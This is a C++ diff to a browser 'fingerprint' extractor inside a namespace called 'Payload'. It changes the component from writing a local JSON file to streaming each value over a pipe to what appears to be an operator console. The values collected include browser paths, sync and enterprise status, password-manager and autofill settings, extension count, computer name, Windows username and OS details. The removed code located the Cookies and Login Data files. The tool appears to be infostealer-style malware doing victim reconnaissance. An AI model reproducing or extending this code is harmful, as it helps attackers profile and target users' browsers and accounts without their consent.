@@ -21,57 +21,30 @@ namespace Payload {
             : m_pipe(pipe), m_browser(browser), m_outputBase(outputBase) {}
 
         void Extract() {
-            m_pipe.LogDebug("Extracting comprehensive fingerprint...");
+            m_pipe.Log("FINGERPRINT_START:" + m_browser.name);
             
-            std::ostringstream json;
-            json << "{\n";
+            // Send summary count (will show as "Fingerprint: 1" in console)
+            m_pipe.Log("FINGERPRINT:1");
             
-            // Basic browser info
-            json << "  \"browser\": \"" << m_browser.name << "\",\n";
+            // Extract and send all fingerprint data
+            ExtractAndSendVersion();
+            ExtractAndSendLocalState();
+            ExtractAndSendPreferences();
+            ExtractAndSendExtensions();
+            ExtractAndSendSystemInfo();
+            ExtractAndSendTimestamps();
             
-            // Get executable path and version
-            char exePath[MAX_PATH] = {0};
-            GetModuleFileNameA(NULL, exePath, MAX_PATH);
-            json << "  \"executable_path\": \"" << EscapeJson(exePath) << "\",\n";
-            
-            ExtractVersion(json, exePath);
-            
-            json << "  \"user_data_path\": \"" << EscapeJson(m_browser.userDataPath.string()) << "\",\n";
-            
-            // Local State analysis
-            ExtractLocalState(json);
-            
-            // Preferences analysis
-            ExtractPreferences(json);
-            
-            // Extensions
-            ExtractExtensions(json);
-            
-            // Profile count
-            ExtractProfileCount(json);
-            
-            // System info
-            ExtractSystemInfo(json);
-            
-            // Timestamps
-            ExtractTimestamps(json);
-            
-            // Remove trailing comma and close
-            json << "  \"extraction_complete\": true\n";
-            json << "}";
-            
-            // Write to file
-            auto outFile = m_outputBase / m_browser.name / "fingerprint.json";
-            std::filesystem::create_directories(outFile.parent_path());
-            std::ofstream out(outFile);
-            if (out) {
-                out << json.str();
-                m_pipe.LogDebug("Fingerprint saved to " + outFile.filename().string());
-            }
+            m_pipe.LogDebug("Fingerprint extraction complete");
         }
 
     private:
-        void ExtractVersion(std::ostringstream& json, const char* exePath) {
+        void ExtractAndSendVersion() {
+            char exePath[MAX_PATH] = {0};
+            GetModuleFileNameA(NULL, exePath, MAX_PATH);
+            
+            m_pipe.Log("FINGERPRINT_DATA:executable_path|" + std::string(exePath));
+            m_pipe.Log("FINGERPRINT_DATA:user_data_path|" + m_browser.userDataPath.string());
+            
             DWORD handle = 0;
             DWORD versionSize = GetFileVersionInfoSizeA(exePath, &handle);
             if (versionSize > 0) {
@@ -80,17 +53,17 @@ namespace Payload {
                     VS_FIXEDFILEINFO* fileInfo = nullptr;
                     UINT len = 0;
                     if (VerQueryValueA(versionData.data(), "\\", (LPVOID*)&fileInfo, &len) && len > 0) {
-                        json << "  \"browser_version\": \""
-                             << HIWORD(fileInfo->dwFileVersionMS) << "."
-                             << LOWORD(fileInfo->dwFileVersionMS) << "."
-                             << HIWORD(fileInfo->dwFileVersionLS) << "."
-                             << LOWORD(fileInfo->dwFileVersionLS) << "\",\n";
+                        std::string version = std::to_string(HIWORD(fileInfo->dwFileVersionMS)) + "." +
+                                            std::to_string(LOWORD(fileInfo->dwFileVersionMS)) + "." +
+                                            std::to_string(HIWORD(fileInfo->dwFileVersionLS)) + "." +
+                                            std::to_string(LOWORD(fileInfo->dwFileVersionLS));
+                        m_pipe.Log("FINGERPRINT_DATA:browser_version|" + version);
                     }
                 }
             }
         }
 
-        void ExtractLocalState(std::ostringstream& json) {
+        void ExtractAndSendLocalState() {
             auto localStatePath = m_browser.userDataPath / "Local State";
             if (!std::filesystem::exists(localStatePath)) return;
 
@@ -100,17 +73,17 @@ namespace Payload {
             std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
             
             // Sync/account status
-            json << "  \"sync_enabled\": " << (ContainsKey(content, "account_info") ? "true" : "false") << ",\n";
+            m_pipe.Log("FINGERPRINT_DATA:sync_enabled|" + std::string(ContainsKey(content, "account_info") ? "Yes" : "No"));
             
             // Enterprise management
-            json << "  \"enterprise_managed\": " << (ContainsKey(content, "enterprise") ? "true" : "false") << ",\n";
+            m_pipe.Log("FINGERPRINT_DATA:enterprise_managed|" + std::string(ContainsKey(content, "enterprise") ? "Yes" : "No"));
             
             // Update channel detection
             std::string channel = "stable";
             if (ContainsKey(content, "\"canary\"")) channel = "canary";
             else if (ContainsKey(content, "\"dev\"")) channel = "dev";
             else if (ContainsKey(content, "\"beta\"")) channel = "beta";
-            json << "  \"update_channel\": \"" << channel << "\",\n";
+            m_pipe.Log("FINGERPRINT_DATA:update_channel|" + channel);
             
             // Default search engine
             size_t searchPos = content.find("default_search_provider_data");
@@ -122,17 +95,17 @@ namespace Payload {
                 else if (searchSection.find("duckduckgo") != std::string::npos) searchEngine = "DuckDuckGo";
                 else if (searchSection.find("yahoo") != std::string::npos) searchEngine = "Yahoo";
                 else if (searchSection.find("ecosia") != std::string::npos) searchEngine = "Ecosia";
-                json << "  \"default_search_engine\": \"" << searchEngine << "\",\n";
+                m_pipe.Log("FINGERPRINT_DATA:default_search_engine|" + searchEngine);
             }
             
             // Hardware acceleration
-            json << "  \"hardware_acceleration\": " << (ContainsKey(content, "hardware_acceleration_mode_enabled") ? "true" : "false") << ",\n";
+            m_pipe.Log("FINGERPRINT_DATA:hardware_acceleration|" + std::string(ContainsKey(content, "hardware_acceleration_mode_enabled") ? "Yes" : "No"));
             
             // Browser metrics consent
-            json << "  \"metrics_enabled\": " << (ContainsKey(content, "\"enabled\":true", "metrics") ? "true" : "false") << ",\n";
+            m_pipe.Log("FINGERPRINT_DATA:metrics_enabled|" + std::string(ContainsKey(content, "\"enabled\":true", "metrics") ? "Yes" : "No"));
         }
 
-        void ExtractPreferences(std::ostringstream& json) {
+        void ExtractAndSendPreferences() {
             auto prefsPath = m_browser.userDataPath / "Default" / "Preferences";
             if (!std::filesystem::exists(prefsPath)) return;
 
@@ -142,91 +115,62 @@ namespace Payload {
             std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
             
             // Security features
-            json << "  \"autofill_enabled\": " << (ContainsKey(content, "autofill") ? "true" : "false") << ",\n";
-            json << "  \"password_manager_enabled\": " << (ContainsKey(content, "credentials_enable_service") ? "true" : "false") << ",\n";
-            json << "  \"safe_browsing_enabled\": " << (ContainsKey(content, "safebrowsing") ? "true" : "false") << ",\n";
+            m_pipe.Log("FINGERPRINT_DATA:autofill_enabled|" + std::string(ContainsKey(content, "autofill") ? "Yes" : "No"));
+            m_pipe.Log("FINGERPRINT_DATA:password_manager_enabled|" + std::string(ContainsKey(content, "credentials_enable_service") ? "Yes" : "No"));
+            m_pipe.Log("FINGERPRINT_DATA:safe_browsing_enabled|" + std::string(ContainsKey(content, "safebrowsing") ? "Yes" : "No"));
             
             // Additional security settings
-            json << "  \"do_not_track\": " << (ContainsKey(content, "enable_do_not_track") ? "true" : "false") << ",\n";
-            json << "  \"third_party_cookies_blocked\": " << (ContainsKey(content, "block_third_party_cookies") ? "true" : "false") << ",\n";
+            m_pipe.Log("FINGERPRINT_DATA:do_not_track|" + std::string(ContainsKey(content, "enable_do_not_track") ? "Yes" : "No"));
+            m_pipe.Log("FINGERPRINT_DATA:third_party_cookies_blocked|" + std::string(ContainsKey(content, "block_third_party_cookies") ? "Yes" : "No"));
             
             // Privacy settings
-            json << "  \"translate_enabled\": " << (ContainsKey(content, "translate") && !ContainsKey(content, "\"translate\":{\"enabled\":false}") ? "true" : "false") << ",\n";
+            m_pipe.Log("FINGERPRINT_DATA:translate_enabled|" + std::string(ContainsKey(content, "translate") && !ContainsKey(content, "\"translate\":{\"enabled\":false}") ? "Yes" : "No"));
         }
 
-        void ExtractExtensions(std::ostringstream& json) {
+        void ExtractAndSendExtensions() {
             auto extensionsPath = m_browser.userDataPath / "Default" / "Extensions";
-            if (!std::filesystem::exists(extensionsPath)) {
-                json << "  \"installed_extensions_count\": 0,\n";
-                return;
-            }
-
-            std::vector<std::string> extensionIds;
-            try {
-                for (const auto& entry : std::filesystem::directory_iterator(extensionsPath)) {
-                    if (entry.is_directory()) {
-                        extensionIds.push_back(entry.path().filename().string());
-                    }
-                }
-            } catch (...) {}
-
-            json << "  \"installed_extensions_count\": " << extensionIds.size() << ",\n";
+            int extensionCount = 0;
             
-            if (!extensionIds.empty()) {
-                json << "  \"extension_ids\": [";
-                for (size_t i = 0; i < extensionIds.size(); ++i) {
-                    json << "\"" << extensionIds[i] << "\"";
-                    if (i < extensionIds.size() - 1) json << ", ";
-                }
-                json << "],\n";
-            }
-        }
-
-        void ExtractProfileCount(std::ostringstream& json) {
-            int profileCount = 0;
-            try {
-                for (const auto& entry : std::filesystem::directory_iterator(m_browser.userDataPath)) {
-                    if (entry.is_directory()) {
-                        auto cookiePath = entry.path() / "Network" / "Cookies";
-                        auto loginPath = entry.path() / "Login Data";
-                        auto loginAccountPath = entry.path() / "Login Data For Account";
-                        if (std::filesystem::exists(cookiePath) ||
-                            std::filesystem::exists(loginPath) ||
-                            std::filesystem::exists(loginAccountPath)) {
-                            profileCount++;
+            if (std::filesystem::exists(extensionsPath)) {
+                try {
+                    for (const auto& entry : std::filesystem::directory_iterator(extensionsPath)) {
+                        if (entry.is_directory()) {
+                            extensionCount++;
                         }
                     }
-                }
-            } catch (...) {}
-            json << "  \"profile_count\": " << profileCount << ",\n";
+                } catch (...) {}
+            }
+            
+            m_pipe.Log("FINGERPRINT_DATA:installed_extensions_count|" + std::to_string(extensionCount));
         }
 
-        void ExtractSystemInfo(std::ostringstream& json) {
+        void ExtractAndSendSystemInfo() {
             // Computer name
             char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
             DWORD size = sizeof(computerName);
             if (GetComputerNameA(computerName, &size)) {
-                json << "  \"computer_name\": \"" << EscapeJson(computerName) << "\",\n";
+                m_pipe.Log("FINGERPRINT_DATA:computer_name|" + std::string(computerName));
             }
 
             // Windows username
             char userName[256] = {0};
             DWORD userSize = sizeof(userName);
             if (GetUserNameA(userName, &userSize)) {
-                json << "  \"windows_user\": \"" << EscapeJson(userName) << "\",\n";
+                m_pipe.Log("FINGERPRINT_DATA:windows_user|" + std::string(userName));
             }
 
             // OS Version info
             OSVERSIONINFOEXW osInfo = {0};
             osInfo.dwOSVersionInfoSize = sizeof(osInfo);
             
-            // Try RtlGetVersion (more reliable than GetVersionEx)
             using RtlGetVersionPtr = NTSTATUS(WINAPI*)(PRTL_OSVERSIONINFOW);
             if (auto ntdll = GetModuleHandleW(L"ntdll.dll")) {
                 if (auto pRtlGetVersion = reinterpret_cast<RtlGetVersionPtr>(GetProcAddress(ntdll, "RtlGetVersion"))) {
                     if (pRtlGetVersion(reinterpret_cast<PRTL_OSVERSIONINFOW>(&osInfo)) == 0) {
-                        json << "  \"os_version\": \"" << osInfo.dwMajorVersion << "." 
-                             << osInfo.dwMinorVersion << "." << osInfo.dwBuildNumber << "\",\n";
+                        std::string osVersion = std::to_string(osInfo.dwMajorVersion) + "." + 
+                                               std::to_string(osInfo.dwMinorVersion) + "." + 
+                                               std::to_string(osInfo.dwBuildNumber);
+                        m_pipe.Log("FINGERPRINT_DATA:os_version|" + osVersion);
                     }
                 }
             }
@@ -234,31 +178,19 @@ namespace Payload {
             // Architecture
             SYSTEM_INFO sysInfo;
             GetNativeSystemInfo(&sysInfo);
-            const char* arch = "unknown";
+            std::string arch = "unknown";
             switch (sysInfo.wProcessorArchitecture) {
                 case PROCESSOR_ARCHITECTURE_AMD64: arch = "x64"; break;
                 case PROCESSOR_ARCHITECTURE_ARM64: arch = "ARM64"; break;
                 case PROCESSOR_ARCHITECTURE_INTEL: arch = "x86"; break;
             }
-            json << "  \"architecture\": \"" << arch << "\",\n";
+            m_pipe.Log("FINGERPRINT_DATA:architecture|" + arch);
         }
 
-        void ExtractTimestamps(std::ostringstream& json) {
-            // Local State last modified
-            auto localStatePath = m_browser.userDataPath / "Local State";
-            if (std::filesystem::exists(localStatePath)) {
-                try {
-                    auto ftime = std::filesystem::last_write_time(localStatePath);
-                    auto sctp = std::chrono::time_point_cast<std::chrono::system_clock::duration>(
-                        ftime - std::filesystem::file_time_type::clock::now() + std::chrono::system_clock::now());
-                    auto time = std::chrono::system_clock::to_time_t(sctp);
-                    json << "  \"last_config_update\": " << time << ",\n";
-                } catch (...) {}
-            }
-
+        void ExtractAndSendTimestamps() {
             // Current extraction time
             auto now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
-            json << "  \"extraction_timestamp\": " << now << ",\n";
+            m_pipe.Log("FINGERPRINT_DATA:extraction_timestamp|" + std::to_string(now));
         }
 
         bool ContainsKey(const std::string& content, const std::string& key, const std::string& context = "") {
@@ -269,28 +201,6 @@ namespace Payload {
             if (contextPos == std::string::npos) return false;
             size_t keyPos = content.find(key, contextPos);
             return keyPos != std::string::npos && keyPos < contextPos + 500;
-        }
-
-        std::string EscapeJson(const std::string& s) {
-            std::ostringstream o;
-            for (char c : s) {
-                switch (c) {
-                    case '"':  o << "\\\""; break;
-                    case '\\': o << "\\\\"; break;
-                    case '\b': o << "\\b"; break;
-                    case '\f': o << "\\f"; break;
-                    case '\n': o << "\\n"; break;
-                    case '\r': o << "\\r"; break;
-                    case '\t': o << "\\t"; break;
-                    default:
-                        if (static_cast<unsigned char>(c) < 0x20) {
-                            o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << static_cast<int>(c);
-                        } else {
-                            o << c;
-                        }
-                }
-            }
-            return o.str();
         }
 
         PipeClient& m_pipe;
